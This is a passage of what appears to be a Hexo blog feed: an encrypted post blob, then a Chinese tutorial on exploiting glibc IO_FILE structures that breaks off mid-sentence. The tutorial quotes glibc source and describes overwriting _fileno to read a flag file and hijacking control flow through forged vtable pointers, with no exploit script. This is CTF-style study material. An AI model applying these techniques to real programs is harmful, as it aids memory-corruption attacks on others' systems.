b519f42ced4f57fc83b66421b84a85d3747ee2fd981b2d514192692b9f41bbdb67eb5b8f3555f17277378ef660851f6e866f9527570466b49fd0e379a69f863b551f840f20855d8ff71fbbce23f2f52fd93c3e9a14897b2e004e30d0241b52a302d42d92408ab6e97433e4ed42708f4b2e2b429e44f571c3b994e416b879a732fa9d493f54858b65b2b492df1d544efbad8200fe946876d7726800e906bbdbbd5b8472a7816101e5af055f6f4290171e9cb8bde16df8155e9f1d9ba905b388a6334d694d258a6498fa32f4e65eaba6f10d42798a81c3131d83f4e45ff07dcdd3ee1d9073da359c2e509cf0eaa32ab45fd31f61dc853a31f1f6574105f915c56bb40d191da8f40c7c84506d457b000a4e6e2412fa70beb1a941f80e0a31a86cbd0a5e50b220ac4166d6c41791466df3981d63442466b6d08dcd7cb60424f5a7a5a7c677cff97de6acb3e124ee4cb45b71a84f253a3e69ca6d41a35729b49ca1fa6c96036b5854b4c6086137a6faed12780910702d6a2bab619da818cd44fc5e4d8a70600b19f80b59ba7a375bacd3c85672de9c8ebe2f1b9d899f03edc5c689b02f35150987d843f295315d1cf970415cd4086483c1298f0ef5625591ed89216986c1314b2cca961b088999d1930ffa004404b3cb32882ef3dcf5c2aad6fc5968d12a44c2f3c28072b38fb72460e41954cf64b5d1f3dd5944a5576a95337fba6eab020329d4b1b764a640534d58ae9aa4816619d58b2a375d2209be06df880836c9fcbf7a93dc39280173b94520d814b86e87c08ea4292e01a04d8110afe0fa24ce0d25756e373de4549bb670bf08cb9528e11e9ca16af877c64779d7d838b7cac397ac59c3be3cffc3a1ebbae75a0256ea4ed628c03bb566b9d59b4e81298c7748afd2f8adc3cb03c2af4ee77b68e49f41e94602f88e9a71226ee1e1507745f6b35131c1ce48c430f5356bcd1d47a422db095adb67c7c06974358210fbe808398400bb6a8f685c6c45c14b3bd89e88073df845f397d86afdeda26d550ad5c517e44b458955712e01dbd3df4cdd28fee73da16483abc09a78eaea71617581902200e55afc3626ac6752e907ea7fb6a0f4564021684eeff4ab8582da39fd23d667407c8b0ddce89bef33ff15c48c74295166ad8204dccb9332bae7ea5849f9c3f0ab20e349582e6c16c02f0421dc5970e968d993d2f54fa7d34d014a2220db1ed87896b4e431c65344a6a5f1549ce12e39cf4f742bb8ebaa075ab15e25e188d42059e75364bf5b84c04af1d3c4c714f483744083d3f7400c597968eaa49c6b3c8058a8de71b2fe28acc0a13a2fa98d891f7f357759042f3ee7d88220607ae6d2fd5ce0a18e10704c6f6b7a000e265e5c59caf7dfd265747ebcdedffcb13c74f9c74403b537291c873a5b41f779a90d3a4be56c287369acc561302849739e6c533aae075609667462fc808ccc6160471f0ddd7d57d8519de024bf077987d2b8feb869aca8a71d646c6ee4575879444d72e7afe9cb88ed2f4123e85752a7916d12923870dbf6cda94bc7db87acdb47878856a315c40a4fb491f2a8b6b336055acd65eb7fea68c822e40a3def4691dbbdb17bf535974b5fdda6bb0a0db68595606bbce604e690377170b6284be99469004381203f0fa644b3fe7835ad527022894a8956a8fdbdf20f942e7821413b311e635c882167efd1ab0622b2869a17d9f04796b0f2c342f44bb3a1681d05cb8f21992424b5bcd5690927582778a434f434492d66eea10b2abefcc3847639b3429542f24091ed721b7a573dd862490cbbd2203f66f165fd2d3c0ebcbd1ec718074cafa843e5a3611ada080362b3a1365f04f5798d20d2627f83a6f35fee5dfa51e1a0adabaa4ec1949ec58f5ebbf26c8f207780691f67e79cf887d14ac97efc65668b693de608cd032a0798d8092c2f579aa76d4bf66e3ee85b2a47870aafd650bce870d2e3643963cf10f9e3034b38dd5354b9861402a7f4e554355c8d1c90d78ef26a556f2ea3aed99d28f63010a7a1d2729f17042bcab2979d1f930ff5da71ca0ae02f46a1da72ac7dcff5f6f235ae281423c9e8e3cc0a7494b30aafc8b2c495e51af92d36066f1e099f6b03700d19f0e126ae90206797768b187dcef2a95dbd82e99018df80b9341792fcc9b96a715424e5eb015e9564d9dc21fb4ba4ea8bb248798d193bea505560c266debc3326fcf3c81dc5310dd9982de38a9dbede49f574138030553d5fcfac4f1e65fc0380b16051b44459e7155c25bce572df73b04d5c2ba8ef98a0ca9e2951d74fbef0facf6a554d70b22637921678404188474b8ec98c829323ef8a62169f2214593c0755fd2307646fd736e0370068bc9c3b608fbfc4cf04f310bdd278a088721cbf4151b4517352190fc8600230820db0bd4a804bfad4665a421a3e0751486551716583081e5713237bff89d5f5d3e424c30b3fe1919b7ed778cbf4e79641566ddb35e6562f03ba3291d64c0aeb729fa360daedbe8ffb29409ae8f4f1ebe3e35bcf34b990f806434a80bdee38ca4ed4ae42b1779f43d83a6de98baa24d6e944eb38e1e97dda18e696bb9a90650bdd9e97ef66263d5a0d92145598776eec9200ab8c7568aadd612282deec1eb5c09f1d5f4997562aa5dd3400031c15f46ddabb941ad0994c7d1f9222b77d2ab0b4f0a415cfaa71a7659436173365ff251aeecba009e64c3509589875c3ceb256949f55037213b3cf2ef551aac6dd1aaeb285a5941696cc56ed8bcb200af27d8b5555318eb2db39d0716cb405364f6b358caa6dd9e168b6a97112c52cf4338d7eb07122052cbc9a3c2d61a65109cd781443bb7b67f1d1dcf290e4b03cdef3b068eb5040c65f10c0707c8e3869d2afcb86b2a45fa07ef15c3465ba591b7e6011fc4c12eafec04f735e26e8dbe5694f035dca189a17efc34cf87a2bbbb3f6b83472095ede6b18b0c2885bad0890af5a1b37a7f6e7a6fc768827e904473444f233304b20b7e1d9a7987278734b0e06c15eb410cf9f303bf4682a89cfa0e6356fd525d53aa838fa72bfdd4b1d9ba73c465a108cb24687961bb44d50022abd46ae8d875aeaa44d93138a2f0e2d83948d85049880b8c43a5dcd7e9bd57beecd20d1a177fefc11986555e8e006b7848fbbd2612170235ffc0048ba0b94d637f06e0c8710f5569ecc8bdc13c76c9832bd00dbc33e29bc937d48bda9bf3ce7b38ded1c02da10886560d04391e2f1da6ff7164432f71dac7694fe2350ce0924e91c5a1155bcd38065733737cf0a75aeb164328a3dc7baace87eeac9b07e0b994c73298c25c7821450af78c665b631f7ffbb788c686d80c11e1c0eae2445fa2d1f14f04ad020c6d5fab48c2fe9176fad7a1d8df5204e1eb21eab5977bae45fb3984dec1048b033a1f4f3943b9ddf8ff89c8cfecf4316707a6802e76591a9b753f444c8524a01b530d8871b5d1cbb49f6b3e52bbc23c59b0f01e6315f1252ad985bc811e4feebbaf71a8e9fc012f326816c5d54bc4fe4bb5a608ec785caa81364e83904d622a04e4b0060750d3d3243650bdbea8b5225cf60cecc14de8259c1018adfd8f9671618f6692247272e8a0f2f2cb61824df6015560b71e8c5a37dd074c92344f5ff4bf9b373df699a99c1d8f837829f8792f84f8b6df7bcbb1aec1eb2aae16610de93aae9ae9dade30efcf3039014c2e35d1d2dd27ac17f688410c4cc5f45f97faac146ff9756e3b85f6d11d96be3d246c0fda4776b311637422f5a74b98a6cefa4c49708c2ef4366ceb9bb39fcca267b61816e8867816dbeaca7b2dc1d89534c712a98f5ee716d10a881624c998a203522e08ccf8ab11d49c05cb8aad77670585579a4bf33d5cd92b4be7948840a83b2dfb8d17329f55754d3e9c99cb774b1a9d46ed0d064ae2c093a9d27ddeabc9801536ff89f038f8546da42bb50331408067f75455a229d4f08365e96a4f1d810a35ba44173f7ced97e686cfe6a3f8967c369de10da5b50c8fbb47597057dc0f43610b9062327402ec92f6192ad14b95a1b0140d8901e5234e2238a4d3325076358664340d8a584b723f2cffe21333641f2b4d7eb7b055b40eb1ee4c1ec548cc1b8eeccb921ef589ffbbba88d2f87f16269dc7ee9bd0feb7f4ff7b1a6dc45049bd3d70a06f92c2d43ba3b745446a64246503d821d3ac8d15157ac4cf75d9c5d20fce7d326627ff6d83470579b120a6fd2cee077beda515ec611ae3752ec6b983124287993e00b27f92853243081e2daf6db2f1763f32488c386269a55ef15239a9df74df5ab2eb6ae7c43226d79b959d117c35587e8eacca66a0eae2b86fe9541eb76ad4ac0d66337b75ff1f3f6fcaa0d676eae314cf6879573004075e5144a3550f69fdfabd8a40dfefd930112ba9e8d8713633b7689398d9fb7f89e994dafaf68553dc74454ed97e3d02d970d09570c83f9af8430c38422544460cf7e54de1dfbb1a0a3850c2134ef18ad7021215d67c762ebf212d99f9a9b7f69b6e861b17eec3a66598852888e382a46909153c9267777de559dc2db5088d011e7eb30d548665d7da6d6beecf86acc377fff0489d42bdd36734c7a1e3c900ca8c820890d9b4ec5db3f0ca7b86611baecda72845af8c5e92f5dbd7810e2fdc8b5f8955fff4f437f31d399d430d5c664e32855db823dc39b8adf7f04e4db219bb89d40e1a5c8e5f52bbedae78141c274d50702e4be0b0dfcd2f59dadb7200e480af391c4d485ca7061121ebd33df6ff96789523ab818fd5ad7a26b556e96de9e8eaf922c0aa7e77c23641429913e90baca04cbc80c316b9b26bad5ecb94863411cbbeae642404928e6c80505604c4f16079bfc5c845e8809b90abd51adbe6cf6a7efe3c82838097ca37cf5e544667a074caff2edf2a969e19fd1cd1e85fd18101c6967d8c5f3a1815fbe13ee56f5992d99b207e8718f39f0c184b4d16f4a0d9709e85e234ba6edb6efadc68d21cb846d355ca1e48f8d8b6fcaac85f82c579243cc137b3fd1caf9fce2b04b055bd11e9a8fa7494ada2d3626886b07a1c144268077c1e2bfe917ed0bbacf128317a2f503041b0fb792ab6d3fb4b70013fb94fa3dade783ba6a8ac70bae4ff7393160a8857af971e630522d80caaf2a2ac87a7d9de39e1f751bdc1312690dc99c78dfff1067b9ce89382ee640713c7f06b2bc219b03feece134be2166b4d792ab0ca9cfb9d9af000b717fbe2991f875cf565644b3b6993e57ec93259101b7b7b2c482e2b226fa4a6c66464970925d89e22039b0cd84bfdc99836468b9b8895e45d4c7dd9605bc3fc96674459f9ed8e87c789d0500fea0931ca7e92ad1c78832c5324d94a03a728a662f36ef6f4657b9b6cbf111682517202a7ba89b5c9019af7ccd014e991247236747033346d51fc844cad83134ac6492d1b9ddbfd87aa4699f3eb80649dc4546fb83b6e44f77f5c58fec7057498f150da921a0c46d8128c46d0cd1fbada321e0fa6772471a2affb11b0ca630b2bcd64e649217a0afb8d9293f9dd232506771ee301ca349c9fba43c2855de6583d85fb6fa925fe1d28a0753537b1f6bc93efc78d788146130e0ff63108ddba941e9c2faa8e70c53e92c4de8b1e67d78aa9d0642da2fd1b0ae17dde104404936bba34a4e2f61619fca35b5c5568fb5a70105ee6253b8f72456487bbc9109f65602bc59162aa1d004953db283b6acca49986e26d74d6c7924626dfd62d329edfcac5862a2ff6c4a4ba3012b7404591989119067c1f0661eaa3d41fb979b8525acb67ef751b73cde6b6b6215d70ed6168b9d17c3edb56f7465330001150482b9bc25854d79a667cc1c9e5dea1dd94c478644b18539a7db09007628a72443f764b2842f1d8da1ec385d1bec13554a1220b5e2d6ff45cb512bd76845630a2975d467ac0323679b8ae0754500d6727a125fc3b09ffa4334fd126fe0d26d80774210248bb3b7e31ab103428642836eceac577a9c9b168ef92d7b2426713bf9765312ea6c67764acb9840feaee0ca84ccda1d52a942d52474b65829e5a6cb1f636b6bfbb1edd41e4f882b83c9842328a3659ded5528230abe90ff6b83285ad787fb6f152995af83bc28a4381728fb02bd2f674555bd44c2b9069aba736cde2ece09b55ea82b9f1aa6d5592a59c465762147561add1bc82700021ebd96738f6eb30ffab29cbafdc03847fb45502bb0c0d87070afb85994ef3c4129cd92444d85b6449f6f89a06664d1abb6d50fad34068c81d2a3a33a2b6820bf43be870da03be467128c9fd23597f005d86baa105aef73221d5bab36e7cd88eb53ec491f9cf3ee03def15767df50558740cd27f775f7bf45cecec9bbbf9b683302857294f1f3fc7e257e885628e9f36cac2104cd0d4fa248863efc1b4455298e7d18827e797863a4b4c23330496847cbb34772d3f3b31baeef560b8998cd9ba6ca0d4913ba54d2b7fb58d80af8e8c09f814db7c330758c340ba0965216b4f0ac703aa11d3eb6b33cf0139cf7849700cb1db79e7ab614a0220f158c5e84002b8de7ce0b7a7d3d5d5e5b860146c93781539b2c4a5face4f04255ea1738b64ca99af372597e0b93a3306177fbb0aa4dbf2ea1dc2411acdea445c8ac74d11811b2e0ca96586309bf3714e57112783c2dd962b87fa0f015bba4e802cf1523f03302a4db7ef195e238933d4d4bc7b65c8f0e8bd3dda8399336faf806ecfca4e437c88524efd0c51f3ac334342d4f1405a19816ee87b99f11bda7994e231a0dce8986828c4c13bbf7568f17e40449b98a87a1a3426d0ae0b44a19dd006d429d38fa620ff2cdd5035a2561e905dadb86ebab198915cd3233c44b4f6ced493e89eab8f2f8baffca095d431b3af9b1ef3c111ca09d2fc6376dc8a0f7adbd2a0852a27c2a544f9f526ffc1a74b823e4305c4f7109e3ede45836f9272d01725b32d14e5f1f714ff3d8663a0ed20501bd650c3d4d72ca0ed5cd57e1cb59ddccd9f56d42a64bd3a5c167715a67f4f2661b06dc01e4ed18a35e7c8cbf4e5691bfc29577f0c95b8e8763d0a5cdb93a7b4b1b21b6eb1b5ff587fbb6a27c8e2490af3a0f86aa68dd9ff5244f81a1abb84ae5b9fabb19f1bdeb90136e2eb099db01dbbd6ea89ab65096907b681df1f2f44e9cf7e4db54ae1818c6b9bacd4fcd2ba083a77b14d88c9bfc570ca1fb4cff91262853e221289ff42aa41e3e6e26157edfc256629d9ad7e60f3375f8c66590c5e496a3814e0e7ac2e1d5b6bffad974860a422124c1f34bb1be8878858123af4824cff0656c71caf954e0edbdb79d3e83268c189a77830cb46dedf4f9bc9196428e11f90664dc8e3585d4ffacd52639704e6bc0c2bef2fd59b9af3955b61bea6aad0c37b70958ac8fa0257a1b564f73555170554ccba476cd0835687d2fa97b79861cdfbefdbb4e85a1b806900b38dd125aea92385be7c25071cced9eac8db006815363d72913aba3e172fde7f2578a41a983695c4bd762f91eb5082ed3643ca0620acb3081f44baceabaf2387bcc4599ce025987e40f7738d9882752db1d4e0d46017fa9852e9d991a473e9c2c7cbc0bcf956b8f6ab98e20e4a63b56745292f00b6a09eccb23f4660a17a01425684685e08dfd74e0b27fbc87985fb0673aadc30c646b6a16d420b591c12483691e358d4e41f7adaed57356cf4715c4543c3c6c45fe7aac16a49e2a06e2ba4df98fbfe3fe8cde6d23d1bbc496836ce67a4125239b1697bd0d63b0f00757a7bbeb657d69cddd9dfc5ed4ecf7a14759d924a6824808d609c1614204c6826b9457b48472aa7a94c3b14b3f88596d146d31d022eebb756b60c15ba2f75f21fecaa9e67137d22d5bc7552da64f1ebb8990cc18aa0b2eae37ad76c6ff7a04e84395c9f58938ba13717c698f5a2389e37c6ae3c618237048d02ec56033a17dc46deafce481438fbabdd52c9b3f97ded9e091213f369ef449eda043dcb63bf388c7fb1545a1a374da021de4fec0eab58971c4a91d208b229853e8a987ae5e1d3c8a6efbb5a825d86686ca0a0bbfa54f88836c1a71bf0d30a074f959dd9ba0683c5399a081fd480f262bfb04696ba36599701548e3cb38bd1d27501642f9c6593154f1d0fbcb5726c42f480a7e753036e270cb329bcb98b60e8f90ca5c10d037d3774db35f6eeb55969a9df1c7fdc64f0e7efcdaf0abe357df037e9e54b830f496d160fbdbc1914f015c5033fb1f2c06af39cd005cd9a14a551762645ef95ef19565d2a10b73e6042ff30aa23626366d206308036e0c4900f2483b2e470d161e5bfead7205b820e74ad5314436199a23edacb5cd39b8f1e20dd793aeab0218ce73a475d48c3ddb326b3bea7f69c1d875ee67dbe64180af785a39c16df4637ed16549ac52b8cfc6334be00783ab1cca47ec97e69fa85fe3e24e5fc1aff689e263006f4f43a76f6074983fc9fda9207b7fb2136f6d3474c0878e3e631c311488a46276d8c8d6ed8d3b6e654b06feb71802a242ac836c8e5da9a40057e50083598c118e35309acbd779657e223c1652bffd482439b50159766cdccb13a93c68a5c0c91a0c41460d05bb8d6cb5a3713ab8084e1d5e8fcea5f3910e29d5bf0dc534461c175c82b52753a27fd4a02ea8554adc1bce5bafd48293979a327a7e61d9e280364a6e1fe1b3d5b8dcc6392d9e377cd0b369ec835a106badc474ce933a67f54d5e618e192af619aefca4248808f08e43ec900354dfe6ec185fcf39af258c327e0ec2a1608d49a36bf3cd688ef1848bcfa837711379c80153c5e0ab1359aa76fae906d2889a71c4f8785d954516362ef68c189b5552b715087cbcafed8c89a3875ca2467de5529905303a534ad56ce8de92ca49814d9bdf7d5a0865a59e7cf3231ff8054cd3d17a62ba900f7e58a65c33b5debc05a79c7a4d753a8873acd25792ccb9b9c371441bbe19bb1c945ec680914404e7b9b6dadcdea92433b3b703a63be9daa5a2071bcd0ae15bf1ffb555d91681d5b2832e75dd4f381e32e595ee8749ee111f6a8603dfbf57f2d323feb8d3aee942104b8bb0c0cbcdf6db27d370114d791d7c0fac304aace84ec00e60c11c433713511ab50db35fbffe29028e402c1f453516d53050e4249eef9ee1925b3fbc4dc4da44d11f18bde46bfe4d4513bc5c3064090f04b2f7229704768f2a60c3b27f09307bccd572e4f3d4f4a8a7ac0314a61ab99cd96f1614c85a83434b42aa815b1652ef0586ab0d154f02645e8f6cd73ccc46a34d3efc733123f0629f78e0c79f53fafafbe5700755c9e6d62188aa80035ce3a12e06fff191d70125796b8d6991c348da98b4edc0862ed71ca77fa46524d1c2b39c09be71e741610e9cb485f2167dd8214ad03cadc13a601604715d5601bd1db833a998addf9907a820550de576a7c568626436dc6fc343bbe7ea675bca01316d0bf7ef7ab09782a6b78e1491b27ab9e3ab8d06adf9e74ba0193527c6a57f899a062d15666a9e26886c3930c751156dd90fb3ed598a0f5ec20005c0d319bd5e813a8e08a6d6a6de0bc7fc308cb35bd1d6963709c59e654c485cdcc10590806b1e7644c1635541c5eb2b749c39ee133ad8bacb351b16712529483027ce8080b49df8b7b7103e85710a3bb71af3438de01b0020ff26b270c711b983c4cbb6967290ed08390c22506712dc63538862033dde055b2a71893ec6b7f4f0fd2a5271b65a5fd3b2d6d7cff70545faa70f377ace8e1b13359d57e2530987b42e84cef51456d3ba06be19adaa584e584e9cb43a30b3798d42a5ddae5ff6c58c4f3f685765fdf568d951d4652d6020f62d74e88ba571da6cad51a72d2693198650b53d792209f1eb78807a99c8b167a84df3f88b5aa00d1b463c4fc9bd8e8c0db117c4718bec115405ff089cb0cb064611905d06dfc544513b372a6272829b4468c90516de8f9be6e96c279702a9ec9bfc814febbf1b80efaa02cd224bd039bf8fb19103bc79f664f9d8eb7201a85ef78340394ea1170b0abb359fae25461979f34344f0b5bf3cc4270ff342e83385ca04404e2c685c9719d7665049bdc5471ebdf49e9b3d55b8f080ad0ee871137d8147e62127b48125980eaf2f95a6a0d86c39a5447155774e1abc938c14b03d3f2d8cf69ae029b84f3824a080751cb5ec7d0f52b19b05000dcb05129f6bd096b3edad55f4e9b636733927a780bdfd559dbf77483c226655f6c42d2c35f43945e9a0f481edbbe693ffef8db190e298f0373870544d0757461bf1972d591f7cec30548b7ab630a165f0c8c7b816320168778dcb5bf480e246a61331402e41697f9aba468459c27888aa6be98426e4b5430d6a5e6159518061c4087c7da326710c06df8aae32bd56beeee35fb70db6ff9e538bd3c6080a708d5687a9eb8f4fca67f7c30e6e70f37081fc6d95a4db292ba3644cdfae2f11d18f55885fe4b90d9da0790bf1d8d89d02b6af44690ce35f73a92067c876c003a8219231c017d28e571f81de8e796873aef753b76cf918fcd74b8f868267fa9c4b894d429ee1bd4e96a68170987c318a62c01eb281caa137744c0e0b780b41b11a1507d9dcb21f60f19743d88a776c34342d5f185b1ce62332992f9d41c3c1c270332f583a10281aeb32ef70d01dd2c136ec1abeafcf437b271886aad96aff285dd5cfd9a0d5a552f77ed923f3a987182ce537d1c815237c1a10228c765c8755495e17e7ad7bde6898e08a78bda755e997146f9d3d4d0ad0c3b34e450ec60a97c054d87e7eb2abbfa8615bd8325929b3fc8df3d5217e6e625c45343e5bfb39be49fdca3c49b469eb785dc521fa9489f277dc3f17ab62ab405a97b408fc0e254dfacc45b387c103dd237bcf312768afe16a4e1fa7a9190cebcbabfe013aed19e024bad3c418300a21d5e55823057b34899d9e44b2bd618bfce264faaabfe6c73d4eea6615d06e5bfedfd7887d5ecaaa5d3e3369edaeb0a3c14cdb45f9a9794440f416c19537555a7744cac7d84c4926d974ed41f11a87d3d14e9a2b3ec348331b797331b4a6b0f3e46fcca8c29479a60029978f0ed8bb14bf0af927ea0e81785693428917923eaa40474d05df8bd23e2510b243685f3ae4c8ee44c045cc14799de9c2e6b566b99f1f82c73094d0889a1b669953b40b555d07d55ef2a3b6172e0cecc48ee1439cf1ad9b70562eed00cc0f48664eace7a10b3cda6f7a3245815ab165ec77521fd539bc78ac82e8d18ead0c62bedbcd6cdb0ef5a544e30c20f4d1129942801601ca1f66e4f9bdf7a96f4db07a6907409501fec8bd979f1f8c0f03d0f2fb89affe27ea294a1e9e8eed829afecab8572ac6f586251dd5b2def153a7e28fed85ae32fc2481c6d2427369d61a356d58b165f3e40e1b57d109c4dccf832e2dbd99989d6e3c9c176855fa6b6371e3ca251abd43494a05dda6827e0ac44b6516ebb56923cc44a3b5917deabc1f5b2b66e81020a1317e3c2c15abaa59c306f482e395927dd170d927e9b7ec7115b2eda3a31187b683b5e81d8226d34ac5700a41a03b27e59b8bb1ae0d5fbeb661531568390d9ebb1cdc45d4b863a61d2158fdad4005cc02d83a2689ee30d7c164419cf535fa866dc589f47ba0ebfd12afcb6545574a8507529372f6be209f5ededf217e17be2133b27669e6fd5a68a351f41c733d0fa5e06a4e65d9cd0bd3380a6e2f5f63f6c1d7970d096f12eeaca11feacc1bab461432755056b8b7d3df8d267d7cf08b805d864026e2288da7d6d41336f6c3fad06cf54c73af5153392f85675dae5019a606ea01a543c23d3112740282e40954eefa13e9253520adf9ddabb4c0dff1d6b812ccb0dbd76dc19fe9f874f007872ee05f5924588aa20bc5fe1af663b2aaf743831f376d4e97a7bb83f611ae</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
  </entry>
  <entry>
    <title>linux IO_FILE 利用</title>
    <url>/2024/11/08/linux-IO_FILE-exploit/</url>
    <content><![CDATA[<h1 id="file-结构">FILE 结构</h1>
<p>IO FILE 定义的各种主要结构关系如下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ea5063408b268d86b52ecebe0894e2b9.png"
                     
alt="在这里插入图片描述" 
                ></p>
<ul>
<li><p>各种文件结构采用单链表的形式连接起来，通过
<code>_IO_list_all</code> 访问。</p></li>
<li><p><code>vatble</code> 为函数指针结构体，存放着各种 IO
相关的函数的指针。</p></li>
<li><p>初始情况下 <code>_IO_FILE</code> 结构有
<code>_IO_2_1_stderr_</code>
，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin_</code> 三个，通过
<code>_IO_list_all</code> 将这三个结构。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">  static _IO_lock_t _IO_stdfile_##FD##_lock = _IO_lock_initializer; \</span></span><br><span class="line"><span class="meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span></span><br><span class="line"><span class="meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span></span><br><span class="line"><span class="meta">  struct _IO_FILE_plus NAME \</span></span><br><span class="line"><span class="meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span></span><br><span class="line"><span class="meta">       &amp;_IO_file_jumps&#125;</span></span><br><span class="line">       </span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br><span class="line">libc_hidden_data_def (_IO_list_all)</span><br></pre></td></tr></table></figure></div> 并且存在 3
个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code>
分别指向
<code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>
三个结构体。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div> 因此上述结构的关系如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d2828352a7bf33e05ffd15edc47ac75f.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p>果有文件读写操作则会为对应文件创建一个 <code>_IO_FILE</code>
结构体，并且链接到 <code>_IO_list_all</code> 链表上。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
</ul>
<h2 id="fopen">fopen</h2>
<p>关键流程大致如下，具体看源码。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1dee20e9043550b64dc1b3d0fe347f8c.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<h2 id="fread">fread</h2>
<p>关键流程大致如下，具体看源码。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/aaaf2aef59974194e0c422c8173f20d3.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>缓冲区如下：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2fa5c22dfa9505ebfcd7cea0e06b1fab.png"
                      alt="在这里插入图片描述" style="zoom: 67%;" 
                ></p>
<h2 id="fwrite">fwrite</h2>
<p>关键流程大致如下，具体看源码。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cb0f0f01fc0497ec52772692b313d463.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
缓冲区如下：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1763f1198512dc8f9468f862784f8dfa.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ></p>
<h2 id="fclose">fclose</h2>
<p>关键流程大致如下，具体看源码。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/93c639d6e1c30c3a6d70c3d94b653839.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="利用-_fileno-字段泄露数据">利用 _fileno 字段泄露数据</h1>
<p><code>_fileno</code> 的值就是文件描述符，位于 stdin 文件结构开头 0x70
偏移处，比如： stderr 的 <code>fileno</code> 值为2，stdout 的
<code>fileno</code> 值为 1 。在漏洞利用中可以通过修改 <code>stdin</code>
的 <code>_fileno</code> 值来重定位需要读取的文件，本来为 0
的话表示从标准输入中读取，修改为 4 则表示为从文件描述符为 4
的文件中读取，这里利用这个点可以直接读取 flag 。</p>
<h1 id="伪造-vtable-劫持程序流程">伪造 vtable 劫持程序流程</h1>
<p><code>vtable</code> 劫持分为两种，一种是直接改写 <code>vtable</code>
中的函数指针，通过任意地址写就可以实现。另一种是覆盖 <code>vtable</code>
的指针指向我们控制的内存，然后在其中布置函数指针。由于
<code>vtable</code> 一般都不可修改，所以第一种方式不太常见。
<strong>注意： <code>vtable</code> 是否可写跟 libc 有关，而且有的高版本
libc 反而可写，比如下面这个 glibc-2.34。</strong> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f06cdc377965e91d972da30e477f6abd.png"
                     
alt="在这里插入图片描述" 
                > 在 libc2.24 版本之前由于没有
<code>_IO_vtable_check</code> 检查 <code>vtable</code>
